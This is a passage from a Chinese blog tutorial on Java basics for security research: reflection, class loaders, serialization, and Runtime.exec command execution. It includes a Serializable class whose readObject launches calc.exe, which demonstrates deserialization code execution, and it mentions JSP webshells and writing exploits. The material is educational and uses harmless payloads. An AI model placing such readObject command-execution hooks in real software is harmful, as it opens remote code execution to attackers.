 <span class="operator">=</span> class.getDeclaredField(<span class="string">&quot;变量名&quot;</span>);</span><br><span class="line"><span class="comment">//获取成员变量的值</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> field.get(类实例对象);</span><br><span class="line"><span class="comment">//修改成员变量的值</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure><h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException &#123;</span><br><span class="line">        <span class="type">Class</span>  <span class="variable">runtimeClass1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//相当于 import</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span>  runtimeClass1.getDeclaredConstructor();<span class="comment">//相当于编写无参构造类</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);<span class="comment">//取消private的限制</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> constructor.newInstance();<span class="comment">//有了无参构造类以后，我们new了一个对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);<span class="comment">//编写类的方法</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) method.invoke(runtimeInstance,<span class="string">&quot;calc&quot;</span>);<span class="comment">//调用了类的方法</span></span><br><span class="line">        <span class="comment">//接下来就是回显的结果</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inputBufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">        StringBuilder stringBuilder=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = inputBufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            stringBuilder.append(line);</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        inputBufferedReader.close();</span><br><span class="line">        inputStreamReader.close();</span><br><span class="line">        inputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="深入理解反射"><a href="#深入理解反射" class="headerlink" title="深入理解反射"></a>深入理解反射</h3><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220115184644.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220116221535.png"></p><h3 id="反射的作用和意义"><a href="#反射的作用和意义" class="headerlink" title="反射的作用和意义"></a>反射的作用和意义</h3><p>我胡诌的：</p><p>对于安全人员来说，使用反射，可以更加高效的利用项目本身的属性类，而不借助其他外部类去实现一些漏洞的挖掘，这也是我们挖掘gadget的基本思路</p><h2 id="ClassLoader类加载器"><a href="#ClassLoader类加载器" class="headerlink" title="ClassLoader类加载器"></a>ClassLoader类加载器</h2><p>前面提到过编译成class字节码后的文件，会使用类加载器加载字节码。也就是说在java中所有的类都会通过加载器进行加载才能运行。在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader(引导类加载器)</code>、<code>Extension ClassLoader(扩展类加载器)</code>、<code>App ClassLoader(系统类加载器)</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类。<br><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311233314.png"></p><p>这里提到这么多种加载器，他们分别指什么呢？</p><ol><li><p>引导类加载器(BootStrapClassLoader)</p><p>这里我们看到&#x2F;jre&#x2F;lib&#x2F;rt.jar目录，这里面的类都是由BootstrapClassLoader来加载。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220313191113.png"></p></li><li><p>扩展类加载器(ExtensionsClassLoader)</p><p>扩展类加载器(ExtensionsClassLoader)，由sun.misc.Launcher$ExtClassLoader类实现，用来在&#x2F;jre&#x2F;lib&#x2F;ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220313191413.png"></p></li><li><p>App类加载器&#x2F;系统类加载器（AppClassLoader）</p><blockquote><p> App类加载器&#x2F;系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它。</p></blockquote><p>我们可以编写如下代码来确定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(Test.class.getClassLoader().toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220313191720.png"></p></li><li><p>自定义类加载器(UserDefineClassLoader)</p><p>（这方面内容请看<a href="https://h0ld1rs.github.io/posts/42607.html%EF%BC%89">https://h0ld1rs.github.io/posts/42607.html）</a></p></li></ol><h3 id="ClassLoader类-核心方法："><a href="#ClassLoader类-核心方法：" class="headerlink" title="ClassLoader类 核心方法："></a>ClassLoader类 核心方法：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>loadClass(String className)，根据名字加载一个类。</span><br><span class="line"><span class="number">2.</span>defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)，将一个字节流定义为一个类。</span><br><span class="line"><span class="number">3.</span>findClass(String name)，查找一个类。</span><br><span class="line"><span class="number">4.</span>findLoadedClass(String name)，在已加载的类中，查找一个类。</span><br><span class="line"><span class="number">5.</span>resolveClass(链接指定的Java类)</span><br></pre></td></tr></table></figure><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><h3 id="为什么需要使用序列化"><a href="#为什么需要使用序列化" class="headerlink" title="为什么需要使用序列化"></a>为什么需要使用序列化</h3><p>和php使用序列化的情况一样，</p><p>但很多情况下，我们需要保存某⼀刻某个对象的信息，来进⾏⼀些操作。⽐如利⽤反序列化将程序运 ⾏的对象状态以⼆进制形式储存与⽂件系统中，然后可以在另⼀个程序中对序列化后的对象状态数据 进⾏反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。</p><h3 id="应用需求"><a href="#应用需求" class="headerlink" title="应用需求"></a>应用需求</h3><p>想要实现序列化需要满足几个条件</p><ol><li><p>该类必须实现<code>java.io.Serlalizable</code>接口</p></li><li><p>该类的所有属性必须是可序列化的，如果⼀个属性是不可序列化的，则属性必须标明是短暂的。</p><p>比如：static，transient 修饰的变量不可被序列化</p></li></ol><p>用于的场景业务</p><ul><li>把对象的字节序列永久地保存到硬盘上，通常存放在⼀个⽂件中；</li><li>在⽹络上传送对象的字节序列</li></ul><blockquote><p>服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，⽽⽤⼾会话还在进⾏相 应的操作，这时就需要使⽤序列化将session信息保存起来放在硬盘，服务器重启后，⼜重新加载。 这样就保证了⽤⼾信息不会丢失，实现永久化保存。</p><p>最常⻅的是Web服务器中的Session对象，当有 10万⽤⼾并发访问，就有可能出现10万个Session 对象，内存可能吃不消，于是Web容器就会把⼀些seesion先序列化到硬盘中，等要⽤了，再把保 存在硬盘中的对象还原到内存中。</p></blockquote><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>序列化：</p><ul><li><p>ObjectOutputStream类 -&gt; writeObject()</p><blockquote><p>该⽅法对参数指定的obj⽂件进⾏序列化把字节序列写到⼀个⽬标输出流中，按照java标准是 给⽂件⼀个 ser 的扩展名</p></blockquote></li></ul><p>反序列化</p><ul><li><p>ObjectInputStream类-&gt; readObject()</p><blockquote><p>该⽅法是从⼀个输⼊流中读取字节序列，再把他们反序列化成对象，将其返回</p></blockquote></li></ul><p>Java反序列化时会执⾏readObject()⽅法，所以如果readObject()⽅法被恶意构造 的话，就有可能导致命令执⾏。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="comment">//这里设不设置属性无所谓，主要看当时的情况</span></span><br><span class="line">        user.setName(<span class="string">&quot;Wuming&quot;</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;C:\\Users\\12451\\Desktop\\Java-Learn\\src\\main\\java\\com\\Serializable\\test.ser&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;C:\\Users\\12451\\Desktop\\Java-Learn\\src\\main\\java\\com\\Serializable\\test.ser&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">test</span> <span class="operator">=</span> (User) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line"><span class="comment">//    //把object对象储存为字节流的形式</span></span><br><span class="line"><span class="comment">//        FileOutputStream fos = new FileOutputStream(&quot;object&quot;);</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream os = new ObjectOutputStream(fos);</span></span><br><span class="line"><span class="comment">//    //将对象写⼊object⽂件</span></span><br><span class="line"><span class="comment">//        os.writeObject(user);</span></span><br><span class="line"><span class="comment">//        os.close();</span></span><br><span class="line"><span class="comment">//    //从⽂件中反序列化obj对象</span></span><br><span class="line"><span class="comment">//        FileInputStream fis = new FileInputStream(&quot;object&quot;);</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(fis);</span></span><br><span class="line"><span class="comment">//    //恢复对象</span></span><br><span class="line"><span class="comment">//        User user1 = (User) ois.readObject();</span></span><br><span class="line"><span class="comment">//        System.out.println(user1.getName());</span></span><br><span class="line"><span class="comment">//        ois.close();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="关于serialVersionUID-序列号"><a href="#关于serialVersionUID-序列号" class="headerlink" title="关于serialVersionUID(序列号)"></a>关于serialVersionUID(序列号)</h3><h4 id="当我们没有自定义序列化ID"><a href="#当我们没有自定义序列化ID" class="headerlink" title="当我们没有自定义序列化ID"></a>当我们没有自定义序列化ID</h4><p>如果我们没有自定义序列化id，当我们修改User 类的时候，编译器又为我们User 类生成了一个UID，而序列化和反序列化就是通过对比其SerialversionUID来进行的，一旦SerialversionUID不匹配，反序列化就无法成功。在实际的生产环境中，如果我们有需求要在序列化后添加一个字段或者方法,应该怎么办？那就是自己去指定serialVersionUID。</p><h4 id="设置序列化ID"><a href="#设置序列化ID" class="headerlink" title="设置序列化ID"></a>设置序列化ID</h4><p>序列化运行时将一个版本号与每个称为SerialVersionUID的可序列化类相关联，在反序列化过程中使用该序列号验证序列化对象的发送方和接收方是否为该对象加载了与序列化兼容的类。如果接收方为对象加载的类的UID与相应发送方类的UID不同，则反序列化将导致<strong>InvalidClassException</strong>. 可序列化类可以通过声明字段名来显式声明自己的UID。</p><p>它必须是static、final和long类型。例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">public</span>/<span class="keyword">private</span>/<span class="keyword">protected</span>/<span class="keyword">default</span>) <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> serialVersionUID=<span class="number">42L</span>；</span><br></pre></td></tr></table></figure><p>如果可序列化类没有显式声明serialVersionUID，则序列化运行时将根据类的各个方面为该类计算默认值，如Java对象序列化规范中所述。但是，强烈建议所有可序列化类显式声明serialVersionUID值，因为它的计算对类细节高度敏感，这些细节可能因编译器实现而异，因此类中的任何更改或使用不同的id都可能影响序列化的数据。</p><p>还建议对UID使用private修饰符，因为它作为继承成员没有用处。</p><p>IDEA设置自动生成UID的方式请参考<a href="https://blog.csdn.net/gnail_oug/article/details/80263383">https://blog.csdn.net/gnail_oug/article/details/80263383</a></p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>首先介绍最基本的 java中的命令执行</p><p>我们以后，最常用的poc，就是下面的这条</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="comment">//当前执行命令无回显</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里，在额外普及一下，如果需要回显怎么办的问题，主要是用IO流将命令执行后的字节加载出来，然后最基本的按行读取，就可以了。</p><p>在进行网站开发入JSP的时候，我们使用的JSP一句话木马也是根据这个原理进行编写的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ping</span> &#123;</span><br><span class="line">    <span class="comment">//我们需要执行有回显得命令</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;ping baidu.com&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inputBufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">        StringBuilder stringBuilder=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = inputBufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            stringBuilder.append(line);</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        inputBufferedReader.close();</span><br><span class="line">        inputBufferedReader=<span class="literal">null</span>;</span><br><span class="line">        inputStreamReader.close();</span><br><span class="line">        inputStreamReader=<span class="literal">null</span>;</span><br><span class="line">        inputStream.close();</span><br><span class="line">        inputStream=<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Runtime的其他用法"><a href="#Runtime的其他用法" class="headerlink" title="Runtime的其他用法"></a>Runtime的其他用法</h3><p>我们在进行命令执行的时候，是需要区分操作系统的，不同的操作系统所执行的命令方式绝对是不一样的，</p><h4 id="Windows下"><a href="#Windows下" class="headerlink" title="Windows下"></a>Windows下</h4><p>windows 我们可以调用 cmd或者powershell去执行命令，但是powershell一般会限制执行策略，所以使用cmd一般是比较保险的</p><p><a href="https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2">https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String [] cmd=&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>&#125;; </span><br><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span>Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure><h4 id="linux下"><a href="#linux下" class="headerlink" title="linux下"></a>linux下</h4><p>对于linux的话，我们一般可以使用<code>bash</code>进行命令的执行，通常情况下是会有的，但是有的情况，可能没有bash，我们就可以使用<code>sh</code>来进行替代，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String [] cmd=&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ls&quot;</span>&#125;; </span><br><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span>Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure><p>于是乎，在后面我们写exp或者一些工具的时候，就需要根据主机的操作系统进行甄别</p><p>最简单的办法就是使用<code>getProperty</code>函数进行<code>os</code>的名称</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br></pre></td></tr></table></figure><p>初步demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">property</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        String [] cmd1=&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;start calc.exe&quot;</span>&#125;;</span><br><span class="line">        String [] cmd2=&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ls&quot;</span>&#125;;</span><br><span class="line">        String [] cmd = <span class="literal">null</span>;</span><br><span class="line">        System.out.println(property);</span><br><span class="line">        <span class="keyword">if</span> (property.contains(<span class="string">&quot;Windows&quot;</span>))&#123;</span><br><span class="line">             cmd= cmd1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">             cmd= cmd1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span>Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="comment">//取得命令结果的输出流</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="comment">//用输出读取去读</span></span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">        <span class="comment">//创建缓冲器</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inputBufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">        StringBuilder stringBuilder=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = inputBufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            stringBuilder.append(line);</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        inputBufferedReader.close();</span><br><span class="line">        inputBufferedReader=<span class="literal">null</span>;</span><br><span class="line">        inputStreamReader.close();</span><br><span class="line">        inputStreamReader=<span class="literal">null</span>;</span><br><span class="line">        inputStream.close();</span><br><span class="line">        inputStream=<span class="literal">null</span>;</span><br><span class="line"><span class="comment">//        return stringBuilder;</span></span><br><span class="line"><span class="comment">//        这里如果要返回的值的话，返回的应该是stringBuilder</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/a745233700/article/details/82893076">https://blog.csdn.net/a745233700/article/details/82893076</a></p><p><a href="https://www.cnblogs.com/qingchen521/p/8575761.html">https://www.cnblogs.com/qingchen521/p/8575761.html</a></p><p><a href="https://xz.aliyun.com/t/9002#toc-3">https://xz.aliyun.com/t/9002#toc-3</a></p>]]></content>
    
    
